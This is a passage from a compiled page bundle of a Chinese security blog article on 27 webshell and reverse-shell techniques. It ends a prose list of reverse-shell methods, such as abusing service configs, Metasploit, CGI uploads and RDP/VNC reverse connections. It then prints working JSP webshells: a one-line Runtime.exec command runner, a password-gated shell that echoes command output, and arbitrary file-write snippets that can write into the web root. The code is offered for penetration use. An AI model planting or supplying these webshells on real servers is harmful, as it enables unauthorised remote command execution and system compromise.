使用目标系统的服务或守护进程</span></a></h3><p>某些服务或守护进程可能允许攻击者配置外部命令或脚本的执行。攻击者可以利用这些服务来执行反弹shell命令。</p><p>例如，某些Web服务器允许在配置文件中指定错误处理脚本。攻击者可以修改这些配置文件，使其在发生错误时执行反弹shell命令。</p><p><strong>注意</strong>：这种方法需要攻击者具有修改目标系统服务或守护进程配置的权限。</p><h3 id="_25-利用目标系统的漏洞利用工具集" tabindex="-1"><a class="header-anchor" href="#_25-利用目标系统的漏洞利用工具集"><span>25. 利用目标系统的漏洞利用工具集</span></a></h3><p>许多漏洞利用工具集（如Metasploit Framework）提供了自动化的反弹shell功能。攻击者可以使用这些工具集来利用目标系统的已知漏洞，并自动执行反弹shell命令。</p><p><strong>注意</strong>：使用漏洞利用工具集需要攻击者对目标系统的漏洞有深入的了解，并且需要确保所使用的工具集是最新且安全的。</p><h3 id="_26-使用目标系统的内置脚本语言-如python、perl等-的web接口" tabindex="-1"><a class="header-anchor" href="#_26-使用目标系统的内置脚本语言-如python、perl等-的web接口"><span>26. 使用目标系统的内置脚本语言（如Python、Perl等）的Web接口</span></a></h3><p>如果目标系统提供了内置脚本语言（如Python、Perl等）的Web接口（如CGI、FastCGI等），攻击者可能可以利用这些接口来执行反弹shell命令。</p><p>例如，攻击者可以上传一个包含反弹shell代码的CGI脚本，并通过Web浏览器访问该脚本来触发反弹shell。</p><p><strong>注意</strong>：这种方法需要攻击者能够上传并执行Web脚本，并且目标系统需要允许这些脚本语言的Web接口。</p><h3 id="_27-利用目标系统的远程桌面协议-如rdp、vnc等-的反向连接功能" tabindex="-1"><a class="header-anchor" href="#_27-利用目标系统的远程桌面协议-如rdp、vnc等-的反向连接功能"><span>27. 利用目标系统的远程桌面协议（如RDP、VNC等）的反向连接功能</span></a></h3><p>某些远程桌面协议（如RDP、VNC等）允许反向连接，即目标系统主动连接到攻击者的机器。攻击者可以配置这些协议以使用反向连接模式，并在目标系统上启动远程桌面客户端来建立连接。</p><p><strong>注意</strong>：这种方法需要攻击者具有在目标系统上启动远程桌面客户端的权限，并且目标系统需要支持反向连接功能。</p><p><strong>反弹shell是渗透测试中不可或缺的技术之一，允许攻击者获得对目标系统的交互式访问权限，网络安全从业者需要掌握且擅长，能根据不同的场景来使用不同的反弹shell姿势。</strong></p><h3 id="一、无回显的命令执行-命令执行后不会在前端页面返回数据" tabindex="-1"><a class="header-anchor" href="#一、无回显的命令执行-命令执行后不会在前端页面返回数据"><span>一、无回显的命令执行（命令执行后不会在前端页面返回数据）</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>请求url：http://127.0.0.1/shell.jsp?i=whoami</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="二、有回显带密码的命令执行-命令执行后会在前端返回数据" tabindex="-1"><a class="header-anchor" href="#二、有回显带密码的命令执行-命令执行后会在前端返回数据"><span>二、有回显带密码的命令执行（命令执行后会在前端返回数据）</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){</span></span>
<span class="line"><span>        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span></span>
<span class="line"><span>        int a = -1;</span></span>
<span class="line"><span>        byte[] b = new byte[2048];</span></span>
<span class="line"><span>        out.print(&quot;&lt;pre&gt;&quot;);</span></span>
<span class="line"><span>        while((a=in.read(b))!=-1){</span></span>
<span class="line"><span>            out.println(new String(b));</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        out.print(&quot;&lt;/pre&gt;&quot;);</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="三、文件写入-改写目标服务器里的文件-若文件不存在则创建" tabindex="-1"><a class="header-anchor" href="#三、文件写入-改写目标服务器里的文件-若文件不存在则创建"><span>三、文件写入（改写目标服务器里的文件,若文件不存在则创建）</span></a></h3><div class="language-markdown line-numbers-mode" data-highlighter="shiki" data-ext="markdown" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-markdown"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">1.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ISO-8859-1输入:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">new java.io.FileOutputStream(request.getParameter(&quot;file&quot;)).write(request.getParameter(&quot;content&quot;).getBytes());</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">请求url：http://127.0.0.1/input.jsp?file=root/test.txt&amp;content=test</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">2.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> UTF-8输入:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">new java.io.FileOutputStream(request.getParameter(&quot;file&quot;)).write(new String(request.getParameter(&quot;content&quot;).getBytes(&quot;ISO-8859-1&quot;), &quot;UTF-8&quot;).getBytes());</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">请求url：http://127.0.0.1/input.jsp?file=root/test.txt&amp;content=test</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">3.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> Web目录写入;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;) + &quot;/&quot; + request.getParameter(&quot;filename&quot;)).write(request.getParameter(&quot;content&quot;).getBytes());</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">请求url：http://127.0.0.1/input.jsp?file=test.txt&amp;content=test</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="四、编码相关" tabindex="-1"><a class="header-anchor" href="#四、编码相关"><span>四、编码相关</span></a></h3><p>Runtime-exec 编码原理 <a href="https://www.jianshu.com/p/ae3922db1f70" target="_blank" rel="noopener noreferrer">https://www.jianshu.com/p/ae3922db1f70</a></p><p>Runtime-exec 编码工具 <a href="https://www.bugku.net/runtime-exec-payloads/" target="_blank" rel="noopener noreferrer">https://www.bugku.net/runtime-exec-payloads/</a></p><p>Java在线运行环境 <a href="https://www.w3cschool.cn/tryrun/runcode?lang=java-openjdk" target="_blank" rel="noopener noreferrer">https://www.w3cschool.cn/tryrun/runcode?lang=java-openjdk</a></p>`,78)])])}const c=n(l,[["render",p]]),o=JSON.parse('{"path":"/sec/rednote/onekey/Webshell.html","title":"全面解析 27 种 WebShell 反弹技术","lang":"zh-CN","frontmatter":{"date":"2021-09-01T00:00:00.000Z","title":"全面解析 27 种 WebShell 反弹技术","author":["SecCMD"],"description":"本文详细介绍了多达 27 种 WebShell 反弹技术，涵盖 Bash、Netcat、Python、Java 等多种编程语言实现的反弹方法，还包括利用系统工具、漏洞、计划任务等特殊途径进行反弹的操作。同时，为深入探索相关知识，提供了 aspx、ascx、ashx、asmx 等文件的技术研究链接。无论是网络安全从业者提升渗透测试技能，还是技术爱好者深入了解 WebShell 原理，本文都能提供丰富且实用的内容。\\n","categories":"攻防兼备","tags":["网络安全","WebShell","系统安全"],"head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"全面解析 27 种 WebShell 反弹技术\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2021-09-01T00:00:00.000Z\\",\\"dateModified\\":\\"2025-09-12T16:33:57.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"SecCMD\\"}]}"],["meta",{"property":"og:url","content":"https://www.seccmd.net/sec/rednote/onekey/Webshell.html"}],["meta",{"property":"og:site_name","content":"明剑实验室"}],["meta",{"property":"og:title","content":"全面解析 27 种 WebShell 反弹技术"}],["meta",{"property":"og:description","content":"本文详细介绍了多达 27 种 WebShell 反弹技术，涵盖 Bash、Netcat、Python、Java 等多种编程语言实现的反弹方法，还包括利用系统工具、漏洞、计划任务等特殊途径进行反弹的操作。同时，为深入探索相关知识，提供了 aspx、ascx、ashx、asmx 等文件的技术研究链接。无论是网络安全从业者提升渗透测试技能，还是技术爱好者深入了解 WebShell 原理，本文都能提供丰富且实用的内容。\\n"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-09-12T16:33:57.000Z"}],["meta",{"property":"article:author","content":"SecCMD"}],["meta",{"property":"article:tag","content":"系统安全"}],["meta",{"property":"article:tag","content":"WebShell"}],["meta",{"property":"article:tag","content":"网络安全"}],["meta",{"property":"article:published_time","content":"2021-09-01T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-09-12T16:33:57.000Z"}]]},"git":{"createdTime":1737536718000,"updatedTime":1757694837000,"contributors":[{"name":"seccmd","username":"seccmd","email":"79789833+seccmd@users.noreply.github.com","commits":1,"url":"https://github.com/seccmd"},{"name":"fireadm","username":"fireadm","email":"iwanwu@hotmail.com","commits":2,"url":"https://github.com/fireadm"}]},"readingTime":{"minutes":9.09,"words":2728},"filePathRelative":"sec/rednote/onekey/Webshell.md"}');export{c as comp,o as data};
